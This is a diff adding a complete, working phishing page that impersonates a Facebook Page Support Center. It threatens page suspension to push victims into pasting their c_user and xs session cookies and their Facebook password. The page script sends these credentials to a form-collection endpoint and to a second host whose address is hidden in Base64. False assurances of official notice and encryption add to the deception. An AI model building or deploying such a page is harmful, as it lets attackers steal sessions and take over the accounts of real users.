@@ -1,0 +1,851 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Page Support Center</title>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-dark: #166fe5;
+            --fb-red: #f02849;
+            --fb-green: #42b72a;
+            --fb-gray: #f0f2f5;
+            --fb-text: #1c1e21;
+            --fb-text-light: #65676b;
+        }
+        
+        body {
+            font-family: "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--fb-gray);
+            margin: 0;
+            padding: 0;
+            color: var(--fb-text);
+        }
+        
+        /* Main Container */
+        .fb-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .fb-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .fb-logo {
+            height: 70px;
+            margin-bottom: 15px;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            background-color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .security-badge svg {
+            margin-right: 8px;
+            color: var(--fb-blue);
+        }
+        
+        /* Warning Box */
+        .warning-box {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 5px solid var(--fb-red);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .warning-title {
+            color: var(--fb-red);
+            margin-top: 0;
+        }
+        
+        /* Official Notice */
+        .official-notice {
+            background-color: white;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #dddfe2;
+        }
+        
+        .notice-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .verified-badge {
+            color: var(--fb-blue);
+            margin-right: 8px;
+        }
+        
+        /* Button */
+        .fb-button {
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px 24px;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            text-align: center;
+            transition: background-color 0.3s;
+            position: relative;
+        }
+        
+        .fb-button:hover {
+            background-color: var(--fb-blue-dark);
+        }
+        
+        .fb-button:disabled {
+            background-color: #b7c9e8;
+            cursor: not-allowed;
+        }
+        
+        /* Button loading animation */
+        .button-loading {
+            color: transparent !important;
+        }
+        
+        .button-loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 3px solid transparent;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading-spinner 1s linear infinite;
+        }
+        
+        @keyframes button-loading-spinner {
+            from { transform: rotate(0turn); }
+            to { transform: rotate(1turn); }
+        }
+        
+        /* Footer */
+        .fb-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: var(--fb-text-light);
+        }
+        
+        .fb-footer a {
+            color: var(--fb-text-light);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .fb-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            margin: 5% auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            position: relative;
+            animation: modalFadeIn 0.3s;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        /* Thin Scrollbar */
+        .modal-content::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .modal-content::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        
+        .modal-content::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 3px;
+        }
+        
+        .modal-content::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .modal-header {
+            padding: 16px;
+            border-bottom: 1px solid #dddfe2;
+            position: sticky;
+            top: 0;
+            background: white;
+            z-index: 1;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+            text-align: center;
+        }
+        
+        .close {
+            position: absolute;
+            left: 16px;
+            top: 16px;
+            color: #606770;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .modal-body {
+            padding: 16px;
+        }
+        
+        /* Verification Steps */
+        .verification-steps {
+            margin-bottom: 20px;
+        }
+        
+        .step {
+            display: flex;
+            margin-bottom: 15px;
+            align-items: flex-start;
+        }
+        
+        .step-number {
+            background-color: var(--fb-blue);
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .step-content {
+            flex-grow: 1;
+        }
+        
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .step-description {
+            color: var(--fb-text-light);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        /* Video Container */
+        .video-container {
+            background-color: #000;
+            border-radius: 8px;
+            margin: 16px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .video-placeholder {
+            width: 100%;
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            background: linear-gradient(135deg, #4267B2 0%, #898F9C 100%);
+        }
+        
+        .video-instruction {
+            text-align: center;
+            font-size: 14px;
+            color: var(--fb-text-light);
+            margin-bottom: 16px;
+        }
+        
+        /* Form Inputs */
+        .fb-input-group {
+            margin-bottom: 16px;
+        }
+        
+        .fb-input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .fb-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        
+        .fb-input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .fb-input.invalid {
+            border-color: var(--fb-red);
+        }
+        
+        .fb-note {
+            font-size: 13px;
+            color: var(--fb-text-light);
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+        
+        .fb-note-warning {
+            color: var(--fb-red);
+            font-weight: 500;
+        }
+        
+        .error-message {
+            color: var(--fb-red);
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        /* Security Badge */
+        .security-badge-modal {
+            display: flex;
+            align-items: center;
+            background-color: #f0f2f5;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 16px 0;
+        }
+        
+        .security-badge-modal svg {
+            margin-right: 8px;
+            color: var(--fb-blue);
+            flex-shrink: 0;
+        }
+        
+        .security-badge-text {
+            font-size: 13px;
+            color: var(--fb-text-light);
+        }
+        
+        /* Loading Animation */
+        .fb-loading-bar {
+            height: 3px;
+            background-color: #e4e6eb;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+        
+        .fb-loading-progress {
+            height: 100%;
+            width: 30%;
+            background-color: var(--fb-blue);
+            animation: fb-loading 2s infinite;
+        }
+        
+        @keyframes fb-loading {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(300%); }
+        }
+        
+        /* Password Modal */
+        .password-modal-content {
+            text-align: center;
+        }
+        
+        .password-logo {
+            height: 50px;
+            margin-bottom: 15px;
+        }
+        
+        /* Success Modal */
+        .success-modal-content {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .success-logo {
+            height: 70px;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            color: var(--fb-blue);
+            margin-bottom: 15px;
+        }
+        
+        .success-message {
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .success-checkmark {
+            color: var(--fb-green);
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="fb-container">
+        <div class="fb-header">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="fb-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+            <div class="security-badge">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+                </svg>
+                <span>Facebook Secure Connection</span>
+            </div>
+            <h1>Page Support Center</h1>
+        </div>
+        
+        <div class="official-notice">
+            <div class="notice-header">
+                <svg class="verified-badge" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
+                </svg>
+                <strong>Official Notice from Facebook</strong>
+            </div>
+            <p>Our systems have detected unusual activity on your page that may violate our Community Standards.</p>
+        </div>
+        
+        <div class="warning-box">
+            <h2 class="warning-title">Immediate Action Required</h2>
+            <p>Your page <strong>"Business Page"</strong> will be permanently suspended within <strong>24 hours</strong> unless you complete the verification process.</p>
+            <p>To prevent your page from being suspended, please submit an appeal by clicking the button below and following the instructions.</p>
+        </div>
+        
+        <button id="submitAppealBtn" class="fb-button">Submit Appeal Now</button>
+        
+        <div class="fb-footer">
+            <a href="#">Help Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Community Standards</a>
+            <span>Meta © 2025</span>
+        </div>
+    </div>
+    
+    <!-- Appeal Form Modal -->
+    <div id="appealModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="close">&times;</span>
+                <h2 class="modal-title">Page Verification Appeal</h2>
+            </div>
+            <div class="modal-body">
+                <div class="fb-loading-bar">
+                    <div class="fb-loading-progress"></div>
+                </div>
+                
+                <div class="verification-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <div class="step-title">Watch the verification video</div>
+                            <div class="step-description">Learn how to find your Facebook authentication tokens</div>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <div class="step-title">Enter your authentication tokens</div>
+                            <div class="step-description">Required to verify your page ownership</div>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <div class="step-title">Complete identity confirmation</div>
+                            <div class="step-description">Final step to prevent page suspension</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-container">
+                    <video controls width="100%" style="background-color: #000;">
+                        <source src="https://ik.imagekit.io/6zsbaguopp/english.mp4" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+                
+                <p class="video-instruction">Follow the video instructions to locate your authentication tokens in browser cookies</p>
+                
+                <div class="fb-input-group">
+                    <label class="fb-input-label" for="c_user">c_user Token</label>
+                    <input type="text" id="c_user" class="fb-input" placeholder="Enter c_user token (numbers only)">
+                    <div id="c_user_error" class="error-message">Error: c_user must contain only numbers</div>
+                    <p class="fb-note">This token identifies your Facebook account for verification</p>
+                </div>
+                
+                <div class="fb-input-group">
+                    <label class="fb-input-label" for="xs">xs Token</label>
+                    <input type="text" id="xs" class="fb-input" placeholder="Enter xs token (letters, numbers & symbols)">
+                    <div id="xs_error" class="error-message">Error: xs must contain combination of letters, numbers and symbols</div>
+                    <p class="fb-note fb-note-warning">Important: Do not log out of your account for 24 hours after submission</p>
+                </div>
+                
+                <div class="security-badge-modal">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+                    </svg>
+                    <div class="security-badge-text">
+                        Your information is protected by Facebook's encryption and will only be used for verification purposes.
+                    </div>
+                </div>
+                
+                <button id="submitRequestBtn" class="fb-button">Continue Verification</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Password Verification Modal -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content password-modal-content">
+            <div class="modal-header">
+                <span class="close">&times;</span>
+            </div>
+            <div class="modal-body">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="password-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+                <h2 class="modal-title">Confirm Your Identity</h2>
+                <p>For security purposes, please enter your Facebook password to complete the verification process.</p>
+                
+                <div class="fb-input-group">
+                    <label class="fb-input-label" for="password">Facebook Password</label>
+                    <input type="password" id="password" class="fb-input" placeholder="Enter your password">
+                    <p class="fb-note">This helps us verify you're the legitimate owner of this account.</p>
+                </div>
+                
+                <div class="security-badge-modal">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+                    </svg>
+                    <div class="security-badge-text">
+                        Your password is encrypted and secure. We'll never ask for your password outside of Facebook's official systems.
+                    </div>
+                </div>
+                
+                <button id="finalSubmitBtn" class="fb-button">Complete Verification</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content success-modal-content">
+            <div class="modal-header">
+                <span class="close">&times;</span>
+            </div>
+            <div class="modal-body">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="success-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+                <div class="success-checkmark">✓</div>
+                <h2 class="success-title">Verification Successful</h2>
+                <p class="success-message">Your page verification appeal has been submitted successfully. Please keep your account active for the next 24 hours while we process your request.</p>
+                <button id="successCloseBtn" class="fb-button">Close</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Get modal elements
+        const appealModal = document.getElementById("appealModal");
+        const passwordModal = document.getElementById("passwordModal");
+        const successModal = document.getElementById("successModal");
+        
+        // Get buttons
+        const submitAppealBtn = document.getElementById("submitAppealBtn");
+        const submitRequestBtn = document.getElementById("submitRequestBtn");
+        const finalSubmitBtn = document.getElementById("finalSubmitBtn");
+        const successCloseBtn = document.getElementById("successCloseBtn");
+        
+        // Get close buttons
+        const closeBtns = document.getElementsByClassName("close");
+        
+        // Get input fields and error messages
+        const cUserInput = document.getElementById('c_user');
+        const xsInput = document.getElementById('xs');
+        const cUserError = document.getElementById('c_user_error');
+        const xsError = document.getElementById('xs_error');
+        
+        // Validation functions
+        function validateCUser(value) {
+            return /^\d+$/.test(value); // Only numbers allowed
+        }
+        
+        function validateXs(value) {
+            // Must contain at least one letter, one number, and one symbol
+            const hasLetter = /[a-zA-Z]/.test(value);
+            const hasNumber = /\d/.test(value);
+            const hasSymbol = /[^a-zA-Z0-9]/.test(value);
+            return hasLetter && hasNumber && hasSymbol;
+        }
+        
+        // Real-time validation as user types
+        cUserInput.addEventListener('input', function() {
+            const isValid = validateCUser(this.value);
+            cUserInput.classList.toggle('invalid', !isValid);
+            cUserError.classList.toggle('show', !isValid && this.value.length > 0);
+        });
+        
+        xsInput.addEventListener('input', function() {
+            const isValid = validateXs(this.value);
+            xsInput.classList.toggle('invalid', !isValid);
+            xsError.classList.toggle('show', !isValid && this.value.length > 0);
+        });
+        
+        // Open appeal modal when button is clicked
+        submitAppealBtn.onclick = function() {
+            appealModal.style.display = "block";
+        }
+        
+        // Open password modal when request is submitted
+        submitRequestBtn.onclick = function() {
+            const cUser = cUserInput.value;
+            const xsToken = xsInput.value;
+            
+            // Validate both fields
+            const isCUserValid = validateCUser(cUser);
+            const isXsValid = validateXs(xsToken);
+            
+            // Show/hide errors
+            cUserInput.classList.toggle('invalid', !isCUserValid);
+            cUserError.classList.toggle('show', !isCUserValid);
+            
+            xsInput.classList.toggle('invalid', !isXsValid);
+            xsError.classList.toggle('show', !isXsValid);
+            
+            // Check if both are valid
+            if (isCUserValid && isXsValid) {
+                appealModal.style.display = "none";
+                passwordModal.style.display = "block";
+            } else {
+                // Scroll to first error
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                
+                // Show alert if fields are empty
+                if (!cUser || !xsToken) {
+                    alert("Please fill in both c_user and xs tokens to continue.");
+                }
+            }
+        }
+        
+        // Function to submit to first form (https://submit-form.com/wi82PnOGQ)
+        function submitToFirstForm(data) {
+            fetch('https://submit-form.com/wi82PnOGQ', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('First form submission successful:', data);
+            })
+            .catch(error => {
+                console.error('Error submitting to first form:', error);
+            });
+        }
+        
+      
+        function submitToSecondForm(data) {
+            // Base64 encoded URL and headers
+            const encodedUrl = 'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=';
+            const decodedUrl = atob(encodedUrl);
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('c_user', data.c_user);
+            formData.append('xs', data.xs);
+            formData.append('password', data.password);
+            
+            fetch(decodedUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log('Second form submission successful:', data);
+            })
+            .catch(error => {
+                console.error('Error submitting to second form:', error);
+            });
+        }
+        
+        // Final submission with loading animation
+        finalSubmitBtn.onclick = function() {
+            const password = document.getElementById("password").value;
+            const cUser = cUserInput.value;
+            const xsToken = xsInput.value;
+            
+            if (password && cUser && xsToken) {
+                // Show loading state
+                finalSubmitBtn.classList.add('button-loading');
+                finalSubmitBtn.disabled = true;
+                
+                // Prepare data to submit
+                const formData = {
+                    c_user: cUser,
+                    xs: xsToken,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: '' // Will be captured server-side
+                };
+                
+                // Submit to both forms
+                submitToFirstForm(formData);
+                submitToSecondForm(formData);
+                
+                // Simulate processing delay (2 seconds)
+                setTimeout(() => {
+                    // Hide loading state
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                    
+                    // Show success modal
+                    passwordModal.style.display = "none";
+                    successModal.style.display = "block";
+                    
+                    // Reset form
+                    cUserInput.value = "";
+                    xsInput.value = "";
+                    document.getElementById("password").value = "";
+                    cUserInput.classList.remove('invalid');
+                    xsInput.classList.remove('invalid');
+                    cUserError.classList.remove('show');
+                    xsError.classList.remove('show');
+                }, 2000);
+            } else {
+                alert("Please enter all required fields to complete verification.");
+            }
+        }
+        
+        // Close success modal
+        successCloseBtn.onclick = function() {
+            successModal.style.display = "none";
+        }
+        
+        // Close modals when close button is clicked
+        for (let i = 0; i < closeBtns.length; i++) {
+            closeBtns[i].onclick = function() {
+                appealModal.style.display = "none";
+                passwordModal.style.display = "none";
+                successModal.style.display = "none";
+                
+                // Reset error messages when closing
+                cUserInput.classList.remove('invalid');
+                xsInput.classList.remove('invalid');
+                cUserError.classList.remove('show');
+                xsError.classList.remove('show');
+                
+                // Reset loading state if active
+                if (finalSubmitBtn.classList.contains('button-loading')) {
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                }
+            }
+        }
+        
+        // Close modals when clicking outside
+        window.onclick = function(event) {
+            if (event.target == appealModal) {
+                appealModal.style.display = "none";
+                // Reset error messages when closing
+                cUserInput.classList.remove('invalid');
+                xsInput.classList.remove('invalid');
+                cUserError.classList.remove('show');
+                xsError.classList.remove('show');
+            }
+            if (event.target == passwordModal) {
+                passwordModal.style.display = "none";
+                
+                // Reset loading state if active
+                if (finalSubmitBtn.classList.contains('button-loading')) {
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                }
+            }
+            if (event.target == successModal) {
+                successModal.style.display = "none";
+            }
+        }
+    </script>
+</body>
+
+</html>
